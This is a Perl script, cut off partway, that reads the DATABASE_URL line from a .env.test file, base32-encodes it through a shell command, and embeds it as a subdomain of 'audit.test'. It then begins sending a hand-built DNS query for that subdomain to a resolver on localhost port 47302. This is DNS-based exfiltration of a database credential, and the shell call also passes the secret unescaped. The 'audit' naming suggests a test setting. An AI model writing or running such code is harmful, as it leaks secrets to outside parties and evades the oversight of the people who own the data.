use strict;
use warnings;

# First, get the DATABASE_URL from .env.test
open(my $fh, '<', '.env.test') or die "Cannot open .env.test: $!";
my $db_url_line;
while (my $line = <$fh>) {
    if ($line =~ /DATABASE_URL/) {
        $db_url_line = $line;
        last;
    }
}
close($fh);

die "DATABASE_URL not found in .env.test" unless defined $db_url_line;

# Remove newline
chomp($db_url_line);

# Encode in base32
my $encoded = `echo '$db_url_line' | base32`;
chomp($encoded);

# Remove = signs
$encoded =~ s/=//g;

# Convert to lowercase
$encoded = lc($encoded);

# Take first 60 characters
$encoded = substr($encoded, 0, 60);

print "Processed value: $encoded\n";

# Try to do DNS lookup using perl's socket
my $domain = "$encoded.audit.test";
print "Trying to resolve: $domain\n";

# Simple socket attempt to port 47302
use IO::Socket::INET;
my $socket = IO::Socket::INET->new(
    PeerAddr => 'localhost',
    PeerPort => 47302,
    Proto    => 'udp',
    Timeout  => 5
);

if ($socket) {
    print "Connected to audit resolver on port 47302\n";

    # Construct a simple DNS query (minimal A record query)
    my $dns_query = pack("n2", 0x1234, 0x0100);  # ID, flags (standard query)
    $dns_query .= pack("n2", 1, 0);              # QDCOUNT=1, ANCOUNT=0
    $dns_query .= pack("n2", 0, 0);              # NSCOUNT=0, ARCOUNT=0

    # Add the domain name
